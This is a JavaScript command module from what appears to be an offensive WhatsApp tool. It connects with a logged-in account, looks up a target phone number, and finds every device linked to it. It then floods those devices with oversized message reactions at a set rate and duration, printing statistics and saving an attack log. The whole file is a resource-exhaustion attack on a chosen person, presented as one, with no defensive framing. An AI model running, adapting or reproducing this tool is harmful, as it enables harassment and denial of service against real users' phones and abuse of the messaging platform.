import chalk from 'chalk';
import ora from 'ora';
import fs from 'fs';
import path from 'path';
import { createConnectedSocket, markShuttingDown } from '../lib/client.js';
import { checkAuth, sleep, resolveTargetJid } from '../lib/utils.js';
import { discoverDevices } from '../lib/probe.js';
import { EXHAUST_MODES, sendOversizedReaction } from '../lib/exhaust.js';

export async function exhaust(number, options) {
    checkAuth();

    const mode = options.aggression === 'slow' ? 'slow' : 'aggressive';
    const config = EXHAUST_MODES[mode];
    const duration = parseInt(options.duration, 10) || 60;

    console.log(chalk.red.bold('\n⚠️  RESOURCE EXHAUSTION ATTACK'));
    console.log(chalk.dim('─'.repeat(50)));
    console.log(chalk.yellow(`Target: ${number}`));
    console.log(chalk.yellow(`Mode: ${mode}`));
    console.log(chalk.yellow(`Duration: ${duration}s`));
    console.log(chalk.yellow(`Payload: ${config.payloadSize} chars @ ${config.rate}/sec`));
    console.log(chalk.dim('─'.repeat(50)));
    console.log(chalk.red('Press Ctrl+C to stop\n'));

    try {
        const connectSpinner = ora({ text: 'Connecting to WhatsApp...', discardStdin: false }).start();
        const sock = await createConnectedSocket();
        connectSpinner.succeed('Connected to WhatsApp');

        const deviceSpinner = ora({ text: 'Enumerating target devices...', discardStdin: false }).start();
        const resolved = await resolveTargetJid(sock, number);
        const targetJid = resolved.jid;
        const devices = await discoverDevices(sock, targetJid);
        deviceSpinner.succeed(`Found ${devices.length} device(s) for ${targetJid} - all will receive payloads`);

        console.log(chalk.cyan('\nStarting attack...\n'));

        const startTime = Date.now();
        const endTime = startTime + (duration * 1000);
        let sentCount = 0;
        let errorCount = 0;
        let lastReportTime = startTime;

        let running = true;
        process.on('SIGINT', () => {
            running = false;
            markShuttingDown();
            console.log(chalk.yellow('\n\nStopping attack...'));
        });

        while (running && Date.now() < endTime) {
            try {
                await sendOversizedReaction(sock, targetJid, config.payloadSize);
                sentCount++;
            } catch {
                errorCount++;
            }

            const now = Date.now();
            if (now - lastReportTime > 5000) {
                const elapsed = (now - startTime) / 1000;
                const rate = sentCount / elapsed;
                const dataMB = (sentCount * config.payloadSize) / (1024 * 1024);

                console.log(
                    chalk.cyan(`[${elapsed.toFixed(0)}s]`) +
                    ` Sent: ${chalk.green(sentCount)} | ` +
                    `Rate: ${chalk.yellow(rate.toFixed(1))}/s | ` +
                    `Data: ${chalk.magenta(dataMB.toFixed(2))} MB | ` +
                    `Errors: ${chalk.red(errorCount)}`
                );
                lastReportTime = now;
            }

            await sleep(config.delayMs);
        }

        const totalTime = (Date.now() - startTime) / 1000;
        const avgRate = sentCount / totalTime;
        const totalDataMB = (sentCount * config.payloadSize) / (1024 * 1024);

        console.log(chalk.dim('\n' + '═'.repeat(50)));
        console.log(chalk.white.bold('Attack Summary'));
        console.log(chalk.dim('═'.repeat(50)));
        console.log(`Duration: ${totalTime.toFixed(1)}s`);
        console.log(`Reactions sent: ${sentCount}`);
        console.log(`Average rate: ${avgRate.toFixed(1)}/s`);
        console.log(`Total data: ${totalDataMB.toFixed(2)} MB`);
        console.log(`Errors: ${errorCount}`);
        console.log(`Success rate: ${((sentCount / Math.max(1, sentCount + errorCount)) * 100).toFixed(1)}%`);

        if (options.output) {
            if (!fs.existsSync(options.output)) fs.mkdirSync(options.output, { recursive: true });
            const logPath = path.join(options.output, `exhaust-${number}-${Date.now()}.json`);
            fs.writeFileSync(logPath, JSON.stringify({
                target: number,
                jid: targetJid,
                mode,
                duration: totalTime,
                sent: sentCount,
                errors: errorCount,
                avgRate,
                totalDataMB,
                timestamp: new Date().toISOString()
            }, null, 2));
            console.log(chalk.cyan(`\nLog saved to: ${logPath}`));
        }

        markShuttingDown();
        sock.end();
        process.exit(0);
    } catch (error) {
        console.error(chalk.red('Error:'), error);
        process.exit(1);
    }
}
